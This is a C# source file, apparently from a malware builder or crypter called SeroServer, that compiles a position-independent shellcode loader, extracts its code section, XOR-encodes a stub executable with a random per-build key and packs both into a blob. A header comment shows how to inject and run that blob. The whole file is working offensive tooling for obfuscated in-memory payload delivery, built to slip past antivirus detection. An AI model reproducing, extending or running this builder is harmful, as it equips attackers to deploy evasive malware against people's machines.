using System.IO;
using System.Text;

namespace SeroServer.Builder;

/// <summary>
/// Packages the compiled stub EXE as a position-independent shellcode blob.
///
/// Blob layout:
///   [0]  uint32  shellcode_size    — size of the .text section bytes
///   [4]  uint32  entry_offset      — offset of ShellcodeEntry within those bytes
///   [8]  byte[]  shellcode         — raw .text section (shellcode_size bytes)
///   [8+SC]  uint32  pe_size        — original PE size
///   [12+SC] byte[32] xor_key       — per-build random XOR key
///   [44+SC] byte[]  encoded_pe     — XOR-encoded PE (pe_size bytes)
///
/// Caller usage (inject + execute):
///   uint32_t sc_size   = *(uint32_t*)blob;
///   uint32_t entry_off = *(uint32_t*)(blob + 4);
///   void*    entry     = (char*)blob + 8 + entry_off;
///   ((DWORD(WINAPI*)(LPVOID))entry)(blob);   // passes blob_base as blobBase
/// </summary>
public static class ShellcodeExport
{
    // ── Compiler discovery (self-contained — works with both stub and real Crypter.cs) ────

    private static string? FindClExe()
    {
        // vswhere — covers VS 2017/2019/2022/2025 and Build Tools
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");
        if (File.Exists(vswhere))
        {
            foreach (var args in new[]
            {
                @"-latest -products * -requires Microsoft.VisualCpp.Tools.HostX64.TargetX64 -find VC\Tools\MSVC\**\bin\HostX64\x64\cl.exe",
                @"-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-all -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, args)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    string? line;
                    while ((line = p.StandardOutput.ReadLine()?.Trim()) != null)
                        if (!string.IsNullOrEmpty(line) && File.Exists(line)) { p.WaitForExit(5000); return line; }
                    p.WaitForExit(5000);
                }
                catch { }
            }
        }

        // Glob common VS install directories
        foreach (var pf in new[] { Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                                   Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var ver in Directory.GetDirectories(vsBase).OrderByDescending(d => d))
            foreach (var ed  in Directory.GetDirectories(ver).OrderByDescending(d => d))
            {
                var msvc = Path.Combine(ed, "VC", "Tools", "MSVC");
                if (!Directory.Exists(msvc)) continue;
                foreach (var v in Directory.GetDirectories(msvc).OrderByDescending(d => d))
                {
                    var cl = Path.Combine(v, "bin", "Hostx64", "x64", "cl.exe");
                    if (File.Exists(cl)) return cl;
                }
            }
        }

        // PATH fallback
        try
        {
            var psi2 = new System.Diagnostics.ProcessStartInfo("where", "cl.exe")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
            using var p2 = System.Diagnostics.Process.Start(psi2)!;
            var line2 = p2.StandardOutput.ReadLine()?.Trim();
            p2.WaitForExit(3000);
            if (!string.IsNullOrEmpty(line2) && File.Exists(line2)) return line2;
        }
        catch { }
        return null;
    }

    private static void SetMsvcEnv(System.Diagnostics.ProcessStartInfo psi, string clExe)
    {
        try
        {
            var binDir  = Path.GetDirectoryName(clExe)!;
            // cl.exe sits at: MSVC\<ver>\bin\Hostx64\x64\cl.exe  → 3 levels up = MSVC\<ver>
            var msvcDir = Path.GetFullPath(Path.Combine(binDir, "..", "..", ".."));
            var include = Path.Combine(msvcDir, "include");
            var lib     = Path.Combine(msvcDir, "lib", "x64");

            var sdkRoot = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                "Windows Kits", "10");
            string sdkInc = "", sdkLib = "";
            if (Directory.Exists(Path.Combine(sdkRoot, "Include")))
            {
                var sdkVer = Directory.GetDirectories(Path.Combine(sdkRoot, "Include"))
                                      .OrderByDescending(d => d).FirstOrDefault();
                if (sdkVer != null)
                {
                    sdkInc = $"{sdkVer}\\um;{sdkVer}\\shared;{sdkVer}\\ucrt";
                    var libVer = Path.Combine(sdkRoot, "Lib", Path.GetFileName(sdkVer));
                    if (Directory.Exists(libVer))
                        sdkLib = $"{libVer}\\um\\x64;{libVer}\\ucrt\\x64";
                }
            }
            psi.Environment["INCLUDE"] = $"{include};{sdkInc}";
            psi.Environment["LIB"]     = $"{lib};{sdkLib}";
            psi.Environment["PATH"]    = $"{binDir};{Environment.GetEnvironmentVariable("PATH")}";
        }
        catch { }
    }

    // ── Loader source discovery ────────────────────────────────────────────────
    private static string? FindLoaderSrc()
    {
        var base_ = AppDomain.CurrentDomain.BaseDirectory;
        var path  = Path.Combine(base_, "Stubs", "ShellcodeLoader.cpp");
        if (File.Exists(path)) return path;

        var dir = new DirectoryInfo(base_);
        while (dir != null)
        {
            path = Path.Combine(dir.FullName, "Stubs", "ShellcodeLoader.cpp");
            if (File.Exists(path)) return path;
            dir = dir.Parent;
        }
        return null;
    }

    // ── PE helpers ─────────────────────────────────────────────────────────────
    private static (byte[] textBytes, int entryOffset) ExtractTextSection(byte[] pe)
    {
        int lfanew      = BitConverter.ToInt32(pe, 0x3C);
        uint entryRva   = BitConverter.ToUInt32(pe, lfanew + 24 + 16); // OptionalHeader+16
        ushort optSize  = BitConverter.ToUInt16(pe, lfanew + 20);
        ushort numSects = BitConverter.ToUInt16(pe, lfanew + 6);
        int sectBase    = lfanew + 24 + optSize;

        for (int i = 0; i < numSects; i++)
        {
            int s = sectBase + i * 40;
            string name = Encoding.ASCII.GetString(pe, s, 8).TrimEnd('\0');
            if (name != ".text") continue;

            uint virtualSize = BitConverter.ToUInt32(pe, s + 8);
            uint virtualAddr = BitConverter.ToUInt32(pe, s + 12);
            uint rawOffset   = BitConverter.ToUInt32(pe, s + 20);

            byte[] textBytes = pe[(int)rawOffset..(int)(rawOffset + virtualSize)];
            return (textBytes, (int)(entryRva - virtualAddr));
        }
        throw new InvalidDataException(".text section not found in compiled ShellcodeLoader.exe");
    }

    // ── Compile ShellcodeLoader.cpp ────────────────────────────────────────────
    private static async Task<(byte[] textBytes, int entryOffset)?> CompileLoaderAsync(
        string srcPath, Action<string> log)
    {
        var clPath = FindClExe();
        if (clPath == null)
        {
            log("[!] Shellcode: cl.exe not found. Install VS Build Tools with C++ Desktop workload.");
            return null;
        }

        var tempDir = Path.Combine(Path.GetTempPath(), "sero_sc_" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(tempDir);
        var outExe = Path.Combine(tempDir, "sc_loader.exe");
        var outObj = Path.Combine(tempDir, "sc_loader.obj");

        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName  = clPath,
                Arguments =
                    $"\"{srcPath}\" /O1 /GS- /W0 /nologo /EHs-c- " +
                    $"/Fe\"{outExe}\" /Fo\"{outObj}\" " +
                    $"/link /NODEFAULTLIB /SUBSYSTEM:WINDOWS /ENTRY:ShellcodeEntry " +
                    $"/INCREMENTAL:NO /OPT:REF /OPT:ICF",
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
            };
            SetMsvcEnv(psi, clPath);

            using var proc = System.Diagnostics.Process.Start(psi)!;
            var stdout = await proc.StandardOutput.ReadToEndAsync();
            var stderr = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();

            if (proc.ExitCode != 0)
            {
                log($"[!] Shellcode: compile failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
                if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
                return null;
            }
            if (!File.Exists(outExe)) { log("[!] Shellcode: output not found after compile."); return null; }

            var exeBytes = await File.ReadAllBytesAsync(outExe);
            return ExtractTextSection(exeBytes);
        }
        catch (Exception ex) { log($"[!] Shellcode: {ex.Message}"); return null; }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    // ── Public API ─────────────────────────────────────────────────────────────
    /// <summary>Builds the shellcode blob from a compiled stub EXE. Returns null on failure.</summary>
    public static async Task<byte[]?> BuildAsync(string stubExePath, Action<string> log)
    {
        var src = FindLoaderSrc();
        if (src == null)
        {
            log("[!] Shellcode: ShellcodeLoader.cpp not found (expected in Stubs/).");
            return null;
        }

        log("[*] Shellcode: Compiling PIC loader...");
        var result = await CompileLoaderAsync(src, log);
        if (result == null) return null;

        var (textBytes, entryOff) = result.Value;
        log($"[*] Shellcode: Loader .text = {textBytes.Length} B, entry @ +0x{entryOff:X}");

        var peBytes = await File.ReadAllBytesAsync(stubExePath);
        log($"[*] Shellcode: Stub PE = {peBytes.Length / 1024.0:F0} KB");

        // XOR-encode the stub PE with a random 32-byte key
        var key     = new byte[32];
        System.Security.Cryptography.RandomNumberGenerator.Fill(key);
        var encoded = new byte[peBytes.Length];
        for (int i = 0; i < peBytes.Length; i++) encoded[i] = (byte)(peBytes[i] ^ key[i & 31]);

        // Assemble blob
        using var ms = new MemoryStream();
        ms.Write(BitConverter.GetBytes((uint)textBytes.Length));  // [0]  shellcode_size
        ms.Write(BitConverter.GetBytes((uint)entryOff));          // [4]  entry_offset
        ms.Write(textBytes);                                       // [8]  shellcode .text
        ms.Write(BitConverter.GetBytes((uint)peBytes.Length));    // [8+SC]  pe_size
        ms.Write(key);                                            // [12+SC] xor_key
        ms.Write(encoded);                                        // [44+SC] encoded_pe

        var blob = ms.ToArray();
        log($"[+] Shellcode: blob = {blob.Length / 1024.0:F0} KB");
        return blob;
    }
}
